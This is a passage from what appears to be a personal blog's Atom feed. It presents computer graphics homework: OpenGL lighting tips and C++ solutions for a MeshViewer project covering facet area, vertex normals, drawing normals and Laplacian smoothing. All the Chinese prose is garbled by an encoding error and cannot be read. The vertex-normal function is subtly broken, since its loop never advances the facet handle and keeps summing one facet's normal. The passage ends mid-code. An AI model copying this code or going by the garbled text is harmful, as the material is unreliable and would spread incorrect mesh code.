Ê≥ïÂêëÈáèÔºå‰πãÊâÄ‰ª•ÈúÄË¶ÅËá™Âä®normalize Ê≥ïÂêëÈáèÊòØÂõ†‰∏∫Ê≥ïÂêëÈáè‰ºöÂèóÂà∞<code>glScalef</code>ÁöÑÂΩ±ÂìçÔºåÂΩì<code>glScalef</code>Â∞ÜÁâ©‰ΩìÁöÑÂùêÊ†áÊîæÂ§ßkÂÄçÊó∂ÔºåÊ≥ïÂêëÈáèÂèò‰∏∫1/kÔºåÂõ†‰∏∫openglËá™Â∑±ÁöÑÂÖâÁÖßËÆ°ÁÆóË¶ÅÊ±ÇÊ≥ïÂêëÈáèÂçï‰ΩçÂåñÔºåÊâÄ‰ª•‰∏çÈáçÊñ∞Âçï‰ΩçÂåñÔºåËÆ°ÁÆóÁªìÊûúÂ∞±ÊòØÈîôËØØÁöÑ„ÄÇ<br>‰∏æ‰∏™‰æãÂ≠êÂ∞±ÊòØÂ¶ÇÊûú‰∏çÊ∑ªÂä†<code>glEnable(GL_NORMALIZE);</code>Âú®<code>display</code>ÂáΩÊï∞‰∏≠ÊîæÂ§ß‰∏Ä‰∏™Âá†‰ΩïÁâ©‰ΩìÂÆÉÁöÑ‰∫ÆÂ∫¶Â∞±‰ºöÂèòÊöó„ÄÇ</p><p>Âú®<code>display</code>ÂáΩÊï∞‰∏≠Ê∑ªÂä†<code>glClear(GL_DEPTH_BUFFER_BIT | GL_COLOR_BUFFER_BIT);</code>Áî®‰∫éÊ∏ÖÈô§ÁºìÂÜ≤Âå∫„ÄÇ</p><p>Âú®<code>display</code>ÂáΩÊï∞‰∏≠ÊâÄÊúâ‰ª£Á†ÅÂ§ñÂ•ó‰∏Ä‰∏™<code>glPushMatrix();</code>Âíå<code>glPopMatrix();</code>‰øùËØÅÊØèÊ¨°ÂõûË∞ÉÊó∂ÁöÑÁü©ÈòµÊ†à‰∏∫Á©∫„ÄÇ</p><h2 id="Á®ãÂ∫è‰∏ÄÔºöÂä®ÁîªÊïàÊûúÊºîÁ§∫"><a href="#Á®ãÂ∫è‰∏ÄÔºöÂä®ÁîªÊïàÊûúÊºîÁ§∫" class="headerlink" title="Á®ãÂ∫è‰∏ÄÔºöÂä®ÁîªÊïàÊûúÊºîÁ§∫"></a>Á®ãÂ∫è‰∏ÄÔºöÂä®ÁîªÊïàÊûúÊºîÁ§∫</h2><p><a href="https://github.com/KarlRixon/nuaa_cg/tree/master/%E4%BD%9C%E4%B8%9A%E4%B8%80/%E5%8A%A8%E7%94%BB%E6%95%88%E6%9E%9C" target="_blank" rel="noopener">Ê∫êÁ†Å</a></p><p><img src="https://qiniu.karlrixon.cn/blog/181020/0bFl5AJ2L5.png?imageslim" alt="mark"></p><h2 id="Á®ãÂ∫è‰∫åÔºö3D-room-scene"><a href="#Á®ãÂ∫è‰∫åÔºö3D-room-scene" class="headerlink" title="Á®ãÂ∫è‰∫åÔºö3D room scene"></a>Á®ãÂ∫è‰∫åÔºö3D room scene</h2><p><a href="https://github.com/KarlRixon/nuaa_cg/tree/master/‰Ωú‰∏ö‰∏Ä/ÊàøÈó¥ËÆæËÆ°" target="_blank" rel="noopener">Ê∫êÁ†Å</a></p><p><img src="https://qiniu.karlrixon.cn/blog/181020/h4G05EK5Cb.png?imageslim" alt="mark"></p><iframe src="//player.bilibili.com/player.html?aid=34258956&cid=60010777&page=1" scrolling="no" border="0" frameborder="no" framespacing="0" allowfullscreen="true" style="width:100%;height:700px"> </iframe>]]></content>
        <author>
            <name><![CDATA[KarlRixon‚Äôs Blog]]></name>
        </author>
    </entry>
    
    <entry>
        <id>http://blog.karlrixon.cn/2018/10/28/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9B%BE%E5%BD%A2%E5%AD%A6finalal-project-MeshViewer/</id>
        <title><![CDATA[ËÆ°ÁÆóÊú∫ÂõæÂΩ¢Â≠¶finalal_project:MeshViewer]]></title>
        <updated>2018-11-09T12:03:21+08:00</updated>
        <link href="http://blog.karlrixon.cn/2018/10/28/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9B%BE%E5%BD%A2%E5%AD%A6finalal-project-MeshViewer/"/>
        <content type="text/html" src="http://blog.karlrixon.cn/2018/10/28/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9B%BE%E5%BD%A2%E5%AD%A6finalal-project-MeshViewer/"><![CDATA[<h2 id="‰ª£Á†ÅËß£ËØª"><a href="#‰ª£Á†ÅËß£ËØª" class="headerlink" title="‰ª£Á†ÅËß£ËØª"></a>‰ª£Á†ÅËß£ËØª</h2><p>a.È¶ñÂÖà‰ªé<code>meshviewer.cpp</code>ÁúãËµ∑ÔºåÈáåÈù¢ÂåÖÂê´mainÂáΩÊï∞ÂÖ•Âè£ÔºåÊâìÂç∞‰ΩøÁî®ËØ¥ÊòéÔºåËÆæÁΩÆÁ™óÂè£‰ø°ÊÅØÔºåÂàùÂßãÂåñÁÅØÂÖâÊùêË¥®Á≠â‰ø°ÊÅØÔºåÂàõÂª∫ËèúÂçïÔºåÁªòÂà∂ÂõæÂÉèÔºåÁ™óÂè£Â§ßÂ∞èÂèòÂåñÂõûË∞ÉÔºåÈº†Ê†áÁÇπÂáªÂíåÁßªÂä®ÂõûË∞ÉÔºåÈªòËÆ§ÂõûË∞ÉÔºåÈîÆÁõòÂõûË∞ÉÔºåÁΩëÊ†ºÊ®°ÂûãÂ§ÑÁêÜÔºå‰∏ªÂæ™ÁéØ</p><p>b.ÁÑ∂ÂêéË¶ÅËØªÊáÇÁöÑÊòØ<code>MeshInterface.h</code>Êñá‰ª∂ÔºåÂåÖÂê´ÁΩëÊ†ºÊ®°ÂûãÂ§ÑÁêÜÁöÑÊìç‰ΩúÔºå‰∫ÜËß£<code>glNewList</code>Âíå<code>glCallList</code></p><p>c.Êé•ÁùÄÁúãÂÜÖÊ†∏Â§¥Êñá‰ª∂Ôºå<code>Kernal.h</code>Âíå<code>ExKernal.h</code>ÈáåÂåÖÂê´‰∫ÜÊâÄÊúâÂêéÈù¢ÂÜô‰ª£Á†ÅË¶ÅÁî®Âà∞ÁöÑÂáΩÊï∞Â£∞ÊòéÔºå<code>Kernal.h</code>‰∏≠Ë¶ÅÊ≥®ÊÑèÁöÑÊòØ‰ΩïÁßçÂçäËæπÂè•ÊüÑÁöÑËΩ¨Êç¢ÂáΩÊï∞Ôºå<code>ExKernal.h</code>‰∏≠ÁöÑÈ´òÁ∫ßÂäüËÉΩÂáΩÊï∞ÈúÄË¶Å‰∫ÜËß£</p><h2 id="ÊèêÁ§∫"><a href="#ÊèêÁ§∫" class="headerlink" title="ÊèêÁ§∫"></a>ÊèêÁ§∫</h2><p>a.ÂÖ∂‰∏≠1. 2. 4. 5ÁöÑÂáΩÊï∞Â£∞ÊòéÂú® mesh/extension/ExKernelT.h (Êà™ÂõæÂ¶Ç‰∏ã)<br>ÂáΩÊï∞ÂÆûÁé∞ËØ∑Âú®mesh/extension/ExkernelT.cpp ‰∏≠ÂÆåÊàê (Âä°ÂøÖ)</p><p><img src="https://qiniu.karlrixon.cn/blog/181029/ie20LdjLk0.png?imageslim" alt="mark"></p><p>b.ÂÖ∂‰∏≠3ÁöÑÂáΩÊï∞Â£∞ÊòéÂú®read_write/read_write.h<br>ÂáΩÊï∞ÂÆûÁé∞ËØ∑Âú®read_write/read_write.cpp ‰∏≠ÂÆåÊàê (Âä°ÂøÖ)</p><p><img src="https://qiniu.karlrixon.cn/blog/181029/JmeG2b7D19.png?imageslim" alt="mark"></p><p>c.ËØ∑ÊääÊï¥‰∏™‰ª£Á†ÅÁúãÊòéÁôΩÔºåÈáåÈù¢ÂÆûÁé∞‰∫ÜÂêÑÁßçÂü∫Êú¨Êìç‰ΩúÔºå‰æãÂ¶ÇÊ±Ç‰∏âËßíÁΩëÊ†º‰∏≠ÊØè‰∏™‰∏âËßíÂΩ¢ÁöÑÈáçÂøÉ„ÄÅÊ±ÇÊØè‰∏™‰∏âËßíÈù¢ÁâáÁöÑÊ≥ïÂêëÁ≠âÁ≠â„ÄÇ</p><p>d.Á®ãÂ∫èËøêË°åÊà™ÂõæÂ¶Ç‰∏ãÔºö</p><p><img src="https://qiniu.karlrixon.cn/blog/181029/eaf9Ghl9AG.png?imageslim" alt="mark"></p><p>e.Èº†Ê†áÁÇπÂáªÂè≥ÈîÆÔºå‰ºöÂá∫Áé∞‰∏Ä‰∏™Êìç‰ΩúÁïåÈù¢ÔºåÈáåÈù¢Êúâ‰∏Ä‰∫õÁÅØÂÖâÂíåÂÖ∂‰ªñÁªòÂà∂ÊïàÊûú„ÄÇ</p><p><img src="https://qiniu.karlrixon.cn/blog/181029/Gga208dGIg.png?imageslim" alt="mark"></p><h2 id="task1"><a href="#task1" class="headerlink" title="task1"></a>task1</h2><blockquote><p>ËÆ°ÁÆó‰∏âËßíÁΩëÊ†º‰∏≠ÊØè‰∏™‰∏âËßíÂΩ¢(face)ÁöÑÈù¢ÁßØÔºõ10ÂàÜ</p></blockquote><p>Ê≠§ÂáΩÊï∞Â£∞Êòé‰∏∫Ôºö Scalar calc_facet_area(const FacetHandle&amp; _fh); //ÁªôÂÆö‰∏Ä‰∏™‰∏âËßíÈù¢ÁâáÔºåËÆ°ÁÆóÂÆÉÁöÑÈù¢ÁßØ<br>Tips: ÂèØ‰ª•Ê†πÊçÆÁ®ãÂ∫èËæìÂá∫ÁªìÊûúÂà§ÂÆöÊòØÂê¶ËÆ°ÁÆóÊ≠£Á°ÆÔºå‰æãÂ¶ÇÔºåËæìÂÖ•Ê®°Âûãcow.offÔºåÂÆÉÁöÑÊâÄÊúâ‰∏âËßíÈù¢Áâá‰∏≠ÔºåÈù¢ÁßØÊúÄÂ§ßÁöÑ‰∏âËßíÈù¢ÁâáÁöÑÈù¢ÁßØ‰∏∫ÔºöThe maximal area of the mesh is: 0.0494426</p><p>‰ª£Á†ÅÂ¶Ç‰∏ãÔºö</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">template</span>&lt;<span class="class"><span class="keyword">class</span> <span class="title">ExItems</span>&gt;</span></span><br><span class="line"><span class="class"><span class="title">typename</span> <span class="title">ExKernelT</span>&lt;ExItems&gt;:</span>:Scalar</span><br><span class="line">  ExKernelT&lt;ExItems&gt;::calc_facet_area(<span class="keyword">const</span> FacetHandle&amp; _fh)&#123;<span class="comment">/////ËÆ°ÁÆó‰∏âËßíÂΩ¢ÁöÑÈù¢ÁßØ</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">///ÂæóÂà∞ÂçäËæπÂè•ÊüÑ</span></span><br><span class="line">    HalfedgeHandle&amp; hh1 = halfedge_handle(_fh);</span><br><span class="line">    HalfedgeHandle&amp; hh2 = next_halfedge_handle(hh1);</span><br><span class="line">    HalfedgeHandle&amp; hh3 = next_halfedge_handle(hh2);</span><br><span class="line"></span><br><span class="line">    <span class="comment">////Áî±ÂçäËæπÂè•ÊüÑÂæóÂà∞ËæπÂè•ÊüÑ</span></span><br><span class="line">    EdgeHandle&amp; eh1 = edge_handle(hh1);</span><br><span class="line">    EdgeHandle&amp; eh2 = edge_handle(hh2);</span><br><span class="line">    EdgeHandle&amp; eh3 = edge_handle(hh3);</span><br><span class="line"></span><br><span class="line">    <span class="comment">////Áî±ËæπÂè•ÊüÑÂæóÂà∞ÂêÑËæπÈïø</span></span><br><span class="line">    <span class="keyword">float</span> a = calc_edge_length(eh1);</span><br><span class="line">    <span class="keyword">float</span> b = calc_edge_length(eh2);</span><br><span class="line">    <span class="keyword">float</span> c = calc_edge_length(eh3);</span><br><span class="line"></span><br><span class="line">    <span class="comment">////Âà©Áî®Êµ∑‰º¶ÂÖ¨ÂºèÊ±ÇÈù¢ÁßØs=sqrt(p(p-a)(p-b)(p-c))</span></span><br><span class="line">    Scalar area = <span class="number">0.0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">float</span> p = (a + b + c) / <span class="number">2</span>;</span><br><span class="line">    area = <span class="built_in">sqrt</span>(p*(p - a)*(p - b)*(p - c));</span><br><span class="line"></span><br><span class="line">    facet_ref(_fh).area_ = area;</span><br><span class="line">    <span class="keyword">return</span> area;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ÊïàÊûúÂ¶Ç‰∏ãÔºö</p><p><img src="https://qiniu.karlrixon.cn/blog/181029/d8DIbDC712.png?imageslim" alt="mark"></p><h2 id="task2"><a href="#task2" class="headerlink" title="task2"></a>task2</h2><blockquote><p>ËÆ°ÁÆó‰∏âËßíÁΩëÊ†º‰∏≠ÊØè‰∏™È°∂ÁÇπ(vertex) ÁöÑÊ≥ïÂêëÔºõ20ÂàÜ</p></blockquote><p>Ê≠§ÂáΩÊï∞Â£∞Êòé‰∏∫Ôºöinline Normal calc_normal(const VertexHandle&amp; _vh);///ËÆ°ÁÆóÈ°∂ÁÇπÁöÑÊ≥ïÂêëÂÄº<br>Tips: Ê≥®ÊÑèÂΩí‰∏ÄÂåñ„ÄÇ</p><p>‰ª£Á†ÅÂ¶Ç‰∏ãÔºö</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">template</span> &lt;<span class="class"><span class="keyword">class</span> <span class="title">ExItems</span>&gt; </span></span><br><span class="line"><span class="class"><span class="title">typename</span> <span class="title">ExKernelT</span>&lt;ExItems&gt;:</span>:Normal</span><br><span class="line">  ExKernelT&lt;ExItems&gt;::calc_normal(<span class="keyword">const</span> VertexHandle&amp; _vh) &#123;<span class="comment">////Êõ¥Êñ∞‰∏Ä‰∏™È°∂ÁÇπÁöÑÊ≥ïÂêë</span></span><br><span class="line">    assert( _vh.is_valid());</span><br><span class="line">    assert( _vh.idx() &lt; vertex_size() );</span><br><span class="line"></span><br><span class="line">    <span class="comment">//Normal          norm(1,1,1);///////Áî®normÂ≠òÂÇ®Ê±ÇÂæóÁöÑÊ≥ïÂêëÂÄº</span></span><br><span class="line">    <span class="function">Normal          <span class="title">norm</span><span class="params">(<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//////////////////////////Âú®Ê≠§ÂÆûÁé∞////////////////////////////////////</span></span><br><span class="line">    HalfedgeHandle firstHH = halfedge_handle(_vh);</span><br><span class="line">    FacetHandle fh = facet_handle(firstHH);</span><br><span class="line">    norm = norm + calc_normal(fh);</span><br><span class="line">    HalfedgeHandle hh = opposite_halfedge_handle(next_halfedge_handle(firstHH));</span><br><span class="line">    <span class="keyword">while</span> (hh != firstHH) &#123;</span><br><span class="line">      norm = norm + calc_normal(fh);</span><br><span class="line">      hh = opposite_halfedge_handle(next_halfedge_handle(hh));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/////////////////////////////////////////////////////////////////////</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> norm.normalize();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="task3"><a href="#task3" class="headerlink" title="task3"></a>task3</h2><blockquote><p>Áî®OpenGLÊää‰∏âËßíÁΩëÊ†º‰∏≠ÊØè‰∏™‰∏âËßíÈù¢Áâá(face)ÁöÑÊ≥ïÂêëÁîªÂá∫Êù•ÔºàÊèêÁ§∫ÔºöÂú®ÊØè‰∏™‰∏âËßíÈù¢ÁâáÁöÑÈáçÂøÉÂ§ÑÁîªÔºâÔºõ20ÂàÜ</p></blockquote><p>Ê≠§ÂáΩÊï∞Â£∞Êòé‰∏∫Ôºöbool ogl_writer2(bool _orient = true, bool _smooth = false);<br>Tips: ÂèØ‰ª•ÂèÇÁÖßÂáΩÊï∞bool ogl_writer(bool  _orient = true, bool _smooth = false)ÁöÑÊù•ÂÆûÁé∞ÔºåËøôÊó∂Âè™ÈúÄË¶ÅÂú®ÊØè‰∏™‰∏âËßíÈù¢Áâá‰∏≠ÁîªÂá∫Ê≥ïÂêëÂç≥ÂèØÔºàÊ≥ïÂêëÁî®LineË°®Á§∫„ÄÇÊåâÈîÆÁõò‰∏ä‚Äùm‚ÄùÂèØ‰ª•Êü•ÁúãÁîªÂá∫Èù¢ÁâáÊ≥ïÂêëÂêéÁöÑÁªìÊûú„ÄÇ</p><p>‰ª£Á†ÅÂ¶Ç‰∏ãÔºö</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">template</span> &lt;<span class="class"><span class="keyword">class</span> <span class="title">Mesh</span>&gt;</span></span><br><span class="line"><span class="class"><span class="title">bool</span> <span class="title">ReaderWriterT</span>&lt;Mesh&gt;:</span>:ogl_writer2(<span class="keyword">bool</span> _orient, <span class="keyword">bool</span> _smooth)&#123;<span class="comment">////Âú®ÈáåÈù¢Êää‰∏âËßíÈù¢ÁâáÊ≥ïÂêëÁîªÂá∫</span></span><br><span class="line">  HalfedgeHandle       cshh;</span><br><span class="line">  Mesh::FacetIterator  fit(mesh_-&gt;facet_begin());</span><br><span class="line"></span><br><span class="line">    <span class="comment">//glShadeModel(GL_FLAT);</span></span><br><span class="line">    glShadeModel(GL_SMOOTH);</span><br><span class="line">    <span class="keyword">int</span> orient = <span class="literal">true</span>;<span class="comment">// (_orient) ? 1 : -1; </span></span><br><span class="line">    mesh_-&gt;update_normals();<span class="comment">//ËÆ°ÁÆóÈù¢Ê≥ïÂêëÂíåÁÇπÊ≥ïÂêë</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (; fit != mesh_-&gt;facet_end(); ++fit) &#123;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> ((*fit).status_.is_deleted()) <span class="keyword">continue</span>;</span><br><span class="line"></span><br><span class="line">      cshh = fit-&gt;halfedge_handle_;</span><br><span class="line">      FacetHandle fh = mesh_-&gt;facet_handle(cshh);</span><br><span class="line">      <span class="keyword">const</span> VertexHandle&amp; vh0 = mesh_-&gt;vertex_handle(cshh);</span><br><span class="line">      glColor3f(<span class="number">1.0</span>, <span class="number">0.0</span>, <span class="number">0.0</span>);</span><br><span class="line">      glBegin(GL_LINES);</span><br><span class="line">      <span class="keyword">do</span> &#123;</span><br><span class="line">        <span class="keyword">const</span> VertexHandle&amp; vh = mesh_-&gt;vertex_handle(cshh);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//glNormal3fv(mesh_-&gt;normal(fh)*orient);</span></span><br><span class="line">        <span class="comment">//glVertex3fv(mesh_-&gt;coord(vh));</span></span><br><span class="line">        cshh = mesh_-&gt;next_halfedge_handle(cshh);</span><br><span class="line">        </span><br><span class="line">        glVertex3fv(mesh_-&gt;calc_centroid(fh));</span><br><span class="line">        glVertex3fv(mesh_-&gt;calc_centroid(fh) + mesh_-&gt;normal(fh));</span><br><span class="line">      &#125; <span class="keyword">while</span> (cshh != fit-&gt;halfedge_handle_);</span><br><span class="line">      glEnd();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ÊïàÊûúÂ¶Ç‰∏ã:</p><p><img src="https://qiniu.karlrixon.cn/blog/181029/3FF0CJmga7.png?imageslim" alt="mark">  </p><h2 id="task4"><a href="#task4" class="headerlink" title="task4"></a>task4</h2><blockquote><p>ÂÆûÁé∞‰∏ÄÁßçÁÆÄÂçïÁöÑ‰∏âËßíÁΩëÊ†ºÂéªÂô™ÁÆóÊ≥ïÔºà‰æãÂ¶ÇÊãâÊôÆÊãâÊñØÂÖâÈ°∫ÔºâÔºõ30ÂàÜ</p></blockquote><p>Ê≠§ÂáΩÊï∞Â£∞Êòé‰∏∫Ôºövoid Laplacian_Smoothing();//////////////////ÂÆûÁé∞‰∏ÄÁßç‰∏âËßíÁΩëÊ†ºÂéªÂô™ÁÆóÊ≥ï<br>Tips: ÂèØ‰ª•ÂèÇÁÖßÂ∑≤ÁªèÂÆûÁé∞ÁöÑ‰∏§‰∏™ÂéªÂô™ÁÆóÊ≥ïÔºõÊåâÈîÆÁõò‰∏ä‚Äùb‚ÄùÂèØ‰ª•Êü•ÁúãÂéªÂô™ÁªìÊûú„ÄÇ</p><p>‰ª£Á†ÅÂ¶Ç‰∏ãÔºö</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">template</span>&lt;<span class="class"><span class="keyword">class</span> <span class="title">ExItems</span>&gt;</span></span><br><span class="line"><span class="class"><span class="title">void</span> <span class="title">ExKernelT</span>&lt;ExItems&gt;:</span>:Laplacian_Smoothing()&#123;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/////ËØ∑ÂÆûÁé∞Ëá™Â∑±ÁöÑÂéªÂô™ÁÆóÊ≥ï////////</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">int</span> vertex_num = vertex_size();</span><br><span class="line">  <span class="keyword">int</span> iterations;</span><br><span class="line">  <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">"Input laplacian vertex update iterations(5-30Ê¨°): "</span>;</span><br><span class="line">  <span class="built_in">std</span>::<span class="built_in">cin</span> &gt;&gt; iterations;</span><br><span class="line">  <span class="keyword">int</span> i = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">"Áî±‰∫éËø≠‰ª£ÔºåÊØîËæÉËÄóÊó∂ÔºÅ"</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">  <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">"Please wait.....  "</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">  <span class="keyword">clock_t</span> t1 = clock();</span><br><span class="line">  <span class="keyword">do</span> &#123;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">vector</span>&lt;Coord&gt; updateVertexPosition;</span><br><span class="line">    updateVertexPosition.resize(vertex_num);</span><br><span class="line">    VertexIterator vi(vertex_begin());</span><br><span class="line">    <span class="keyword">for</span> (i=<span class="number">0</span>; vi != vertex_end(); vi++) &#123;</span><br><span class="line">      HalfedgeHandle&amp; hh = vi-&gt;halfedge_handle_;</span><br><span class="line">      HalfedgeHandle css(opposite_halfedge_handle(hh));</span><br><span class="line">      <span class="keyword">int</span> j = <span class="number">0</span>;</span><br><span class="line">      <span class="comment">//Coord cd(0, 0, 0);</span></span><br><span class="line">      <span class="keyword">do</span> &#123;</span><br><span class="line">        updateVertexPosition[i] += coord(vertex_handle(css));</span><br><span class="line">        <span class="comment">//cd += coord(vertex_handle(css));</span></span><br><span class="line">        j++;</span><br><span class="line">        css = opposite_halfedge_handle(prev_halfedge_handle(css));</span><br><span class="line">      &#125; <span class="keyword">while</span> (opposite_halfedge_handle(css) != hh);</span><br><span class="line">      updateVertexPosition[i] /= j;</span><br><span class="line">      i++;</span><br><span class="line">      <span class="comment">//updateVertexPosition.push_back(cd/j);</span></span><br><span class="line">    &#125;</span><br><span class="line">    i = <span class="number">0</span>;</span><br><span class="line">    <span class="comment">//std::vector&lt;Coord&gt;::iterator vpi = updateVertexPosition.begin();</span></span><br><span class="line">    <span class="keyword">for</span> (vi = vertex_begin(); vi != vertex_end(); vi++) &#123;</span><br><span class="line">      vi-&gt;coord_ = updateVertexPosition[i];</span><br><span class="line">      i++;</span><br><span class="line">      <span class="comment">//vpi++;</span></span><br><span class="line">    &#125;</span><br><span class="line">  &#125; <span class="keyword">while</span> (--iterations);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">clock_t</span> t2 = clock();</span><br><span class="line">  <span class="comment">//t2 = (t2-t1)/CLOCKS_PER_SEC;</span></span><br><span class="line">  <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">"The time of laplacian vertex updating: "</span> &lt;&lt; (t2 - t1)*<span class="number">1.0</span> / CLOCKS_PER_SEC &lt;&lt; <span class="string">"s"</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ÊïàÊûúÂ¶Ç‰∏ãÔºö<br>ÂéªÂô™Ââç<img src="https://qiniu.karlrixon.cn/blog/181029/kagkgc82Eb.png?imageslim" alt="mark">ÂéªÂô™Âêé<img src="https://qiniu.karlrixon.cn/blog/181029/b8ED4jA0lE.png?imageslim" alt="mark"></p><h2 id="task5"><a href="#task5" class="headerlink" title="task5"></a>task5</h2><blockquote><p>ÔºàÂèØÈÄâ/ÂèØÂÅöÂèØ‰∏çÂÅöÔºâÂÆûÁé∞‰∏ÄÁßçÂü∫‰∫é‰∏âËßíÁΩëÊ†ºÁöÑÊìç‰ΩúÔºà‰æãÂ¶ÇÔºåÁâπÂæÅÊèêÂèñÔºå‰∏âËßíÁΩëÊ†ºÂàÜÂâ≤Ôºå‰∏âËßíÁΩëÊ†ºÂèòÂΩ¢Á≠âÁ≠âÔºâÔºõ20ÂàÜ</p></blockquote><p>Ê≠§ÂáΩÊï∞Â£∞Êòé‰∏∫: void mesh_process();</p><p>ÊÄùË∑ØÔºöÂÖàÊ±ÇÂá∫‰∏Ä‰∏™ÁÇπÁöÑ‰∏ÄÁéØÈÇªÊé•È°∂ÁÇπÔºåÂ∞ÜÊØè‰∏™ÁÇπÂà∞ËØ•È°∂ÁÇπÁöÑÂêëÈáèÁõ∏Âä†ÔºåÂ∞ÜÁÆóÂæóÁöÑÂêëÈáèÂä†Âà∞ËØ•ÁÇπÂéüÂùêÊ†á‰∏äÂæóÂà∞Êñ∞ÂùêÊ†á„ÄÇÊ≠•È™§ÊòØÂÖàËÆ°ÁÆóÊØè‰∏™ÁÇπÁöÑÊñ∞ÂùêÊ†áÔºåÂ≠òÂÇ®Âà∞ÂÆπÂô®ÔºåÁÑ∂ÂêéÁªü‰∏Ä‰øÆÊîπÁ®ãÂ∫è‰∏≠meshÁöÑÈ°∂ÁÇπÊï∞ÊçÆ„ÄÇ</p><p>‰ª£Á†ÅÂ¶Ç‰∏ãÔºö</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span 